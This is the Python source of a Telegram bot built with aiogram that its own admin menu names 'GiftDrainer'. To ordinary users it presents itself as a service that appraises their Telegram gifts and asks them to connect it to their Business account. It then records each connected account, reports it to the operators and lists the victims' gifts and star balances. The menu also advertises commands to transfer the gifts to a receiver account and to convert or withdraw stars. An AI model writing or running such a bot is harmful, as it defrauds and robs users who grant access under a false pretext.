from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.exceptions import TelegramBadRequest

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGift, ConvertGiftToStars, UpgradeGift, TransferBusinessAccountStars, GetStarsRevenueWithdrawalUrl

import aiogram.exceptions as exceptions
import logging
import asyncio
import json
import config
import os

CONNECTIONS_FILE = "business_connections_replit.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
RECEIVER_ID = config.RECEIVER_ID

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_replit.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_connections():
    """Загружает все соединения из файла"""
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        logger.warning(f"Файл {CONNECTIONS_FILE} не найден")
        return []
    except json.JSONDecodeError as e:
        logger.error(f"Ошибка при разборе JSON-файла {CONNECTIONS_FILE}: {e}")
        return []

def save_business_connection_data(business_connection):
    """Сохраняет данные бизнес-соединения в файл"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or "Unknown"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError as e:
            logger.error(f"Ошибка при чтении файла {CONNECTIONS_FILE}: {e}")
            data = []

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        logger.info(f"Сохранены данные соединения для пользователя {business_connection.user.id}")
    except Exception as e:
        logger.error(f"Ошибка при сохранении данных соединения: {e}")


@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    """Обработчик подключения к Business аккаунту"""
    try:
        logger.info(f"Новое Business подключение: {business_connection.user.id} ({business_connection.user.username})")

        # Сохраняем данные подключения
        save_business_connection_data(business_connection)

        # Отправляем уведомление администраторам
        for admin_id in ADMIN_ID:
            try:
                msg = (
                    f"🤖 Новый бизнес-бот подключен! (Replit версия)\n\n"
                    f"👤 Пользователь: @{business_connection.user.username or '—'}\n"
                    f"�� User ID: {business_connection.user.id}\n"
                    f"🔗 Connection ID: {business_connection.id}\n\n"
                    f"✅ Бот работает в Replit!"
                )
                await bot.send_message(admin_id, msg)
            except Exception as e:
                logger.error(f"Ошибка при отправке уведомления администратору {admin_id}: {e}")

        logger.info(f"Business подключение обработано для пользователя {business_connection.user.id}")

    except Exception as e:
        logger.exception(f"Ошибка при обработке Business подключения: {e}")


@dp.message(F.text == "/start")
async def start_command(message: Message):
    """Команда /start"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("Привет! Я бизнес-бот, оценивающий стоимость подарков на аккаунте Telegram. Убедитесь, что вы подключили меня к своему бизнес аккаунту и выдали соответствующие разрешения")
        return

    connections = load_connections()

    await message.answer(
        f"🤖 GiftDrainer Bot (Replit версия)\n\n"
        f"👋 Привет! Я бот для управления подарками и звездами в Business аккаунтах Telegram.\n\n"
        f"📊 Статистика:\n"
        f"• Подключений: {len(connections)}\n"
        f"• Администраторов: {len(ADMIN_ID)}\n\n"
        f"📋 Доступные команды:\n\n"
        f"�� Просмотр данных:\n"
        f"• /gifts - просмотр подарков по всем подключениям\n"
        f"• /stars - просмотр звезд по всем подключениям\n"
        f"• /balance - проверить балансы аккаунтов\n\n"
        f"🎁 Управление подарками:\n"
        f"• /transfer <gift_id> <user_id> - передать подарок\n"
        f"• /convert - конвертировать все подарки в звезды\n\n"
        f"⭐ Управление звездами:\n"
        f"• /transfer_stars <amount> <user_id> - передать звезды\n"
        f"• /withdraw <amount> [password] - вывести звезды\n\n"
        f"🔧 Диагностика:\n"
        f"• /check_receiver - проверить настройки получателя\n\n"
        f"💡 Важно: Подарки → RECEIVER_ID, Звезды → Владелец Business аккаунта\n\n"
        f"🖥️ Версия: Replit"
    )


@dp.message(F.text == "/gifts")
async def gifts_command(message: Message):
    """Команда для просмотра подарков"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде")
        return

    connections = load_connections()
    if not connections:
        await message.answer("❌ Нет активных подключений")
        return

    try:
        result_msg = "🎁 Подарки по всем подключениям:\n\n"

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "Неизвестно")
            connection_id = connection["business_connection_id"]

            try:
                gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
                gifts = gifts_response.gifts

                unique_count = len([gift for gift in gifts if gift.type == "unique"])
                regular_count = len(gifts) - unique_count

                result_msg += (
                    f"�� @{username} (ID: {user_id})\n"
                    f"▫️ Всего подарков: {len(gifts)}\n"
                    f"▫️ Обычных: {regular_count}\n"
                    f"▫️ Уникальных: {unique_count}\n\n"
                )

            except Exception as e:
                result_msg += f"�� @{username} (ID: {user_id})\n▫️ Ошибка: {e}\n\n"

        await message.answer(result_msg)

    except Exception as e:
        logger.exception(f"Ошибка при получении списка подарков: {e}")
        await message.answer(f"❌ Ошибка при получении подарков: {e}")


@dp.message(F.text == "/stars")
async def stars_command(message: Message):
    """Команда для просмотра звёзд"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде")
        return

    connections = load_connections()
    if not connections:
        await message.answer("❌ Нет активных подключений")
        return

    try:
        result_msg = "⭐ Звезды по всем подключениям:\n\n"
        total_stars = 0

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "Неизвестно")
            connection_id = connection["business_connection_id"]

            try:
                stars_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
                stars_amount = stars_response.star_amount
                total_stars += stars_amount

                result_msg += (
                    f"�� @{username} (ID: {user_id})\n"
                    f"▫️ Звезд: {stars_amount} ⭐\n\n"
                )

            except Exception as e:
                result_msg += f"�� @{username} (ID: {user_id})\n▫️ Ошибка: {e}\n\n"

        result_msg += f"💰 Общий баланс: {total_stars} ⭐"

        await message.answer(result_msg)

    except Exception as e:
        logger.exception(f"Ошибка при получении баланса звезд: {e}")
        await message.answer(f"❌ Ошибка при получении звезд: {e}")


@dp.message(F.text == "/balance")
async def balance_command(message: Message):
    """Команда для проверки баланса Business аккаунтов"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("❌ Нет активных подключений")
            return

        await message.answer("💰 Проверяю балансы Business аккаунтов...")

        total_balances = []

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "Неизвестно")
            connection_id = connection["business_connection_id"]

            try:
                # Проверяем баланс звезд
                try:
                    stars_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
                    star_balance = stars_response.star_amount
                except Exception as e:
                    star_balance = f"Ошибка: {e}"

                # Проверяем количество подарков
                try:
                    gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
                    gifts_count = len(gifts_response.gifts) if gifts_response.gifts else 0
                except Exception as e:
                    gifts_count = f"Ошибка: {e}"

                balance_info = (
                    f"�� @{username} (ID: {user_id})\n"
                    f"⭐ Звезды: {star_balance}\n"
                    f"🎁 Подарки: {gifts_count}\n"
                    f"🔗 Connection ID: {connection_id[:10]}..."
                )

                total_balances.append(balance_info)

            except Exception as e:
                error_info = (
                    f"❌ @{username} (ID: {user_id})\n"
                    f"Ошибка: {str(e)[:100]}..."
                )
                total_balances.append(error_info)
                logger.error(f"Ошибка при проверке баланса для {user_id}: {e}")

        # Отправляем результаты
        final_report = "💰 Балансы Business аккаунтов:\n\n" + "\n\n".join(total_balances)

        await message.answer(final_report)

        logger.info(f"Проверка балансов выполнена администратором {message.from_user.id}")

    except Exception as e:
        logger.exception(f"Ошибка при проверке балансов: {e}")
        await message.answer(f"❌ Ошибка при проверке балансов: {e}")


@dp.message(F.text == "/check_receiver")
async def check_receiver_command(message: Message):
    """Команда для проверки правильности RECEIVER_ID"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("❌ У вас нет доступа к этой команде")
        return

    try:
        await message.answer(
            f"�� Проверка настройки получателя подарков\n\n"
            f"📋 Текущий RECEIVER_ID: {RECEIVER_ID}\n"
            f"📝 Тип: {type(RECEIVER_ID).__name__}\n\n"
            f"💡 Рекомендации:\n"
            f"• Если RECEIVER_ID - число, это должен быть ваш Telegram User ID\n"
            f"• Если RECEIVER_ID начинается с @, это должен быть ваш username\n"
            f"• Получатель должен начать диалог с ботом (/start)\n\n"
            f"�� Для получения User ID:\n"
            f"1. Напишите боту @userinfobot\n"
            f"2. Скопируйте полученный ID в config.py\n"
            f"3. Перезапустите бота"
        )

        logger.info(f"Проверка RECEIVER_ID выполнена администратором {message.from_user.id}")

    except Exception as e:
        logger.exception(f"Ошибка при проверке RECEIVER_ID: {e}")
        await message.answer(f"❌ Ошибка при проверке: {e}")


@dp.message()
async def handle_all_messages(message: Message):
    """Обработчик всех остальных сообщений"""
    # Игнорируем сообщения от администраторов
    if message.from_user.id in ADMIN_ID:
        return

    # Игнорируем сообщения без текста
    if not message.text:
        return

    try:
        logger.info(f"Получено сообщение от пользователя {message.from_user.id}: {message.text[:50]}...")

        # Простой автоответчик
        response = "Спасибо за ваше сообщение! Я бизнес-бот, который помогает управлять подарками и звездами в Telegram. Используйте команду /start для получения списка доступных команд."

        # Отправляем ответ
        await message.answer(response)

        logger.info(f"Отправлен автоответ пользователю {message.from_user.id}")

    except Exception as e:
        logger.exception(f"Ошибка при обработке сообщения от {message.from_user.id}: {e}")
        await message.answer("Извините, произошла ошибка при обработке вашего сообщения.")


async def main():
    """Главная функция для запуска бота"""
    try:
        logger.info("Запуск бота (Replit версия)...")
        await dp.start_polling(bot)
    except Exception as e:
        logger.exception(f"Ошибка при запуске бота: {e}")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())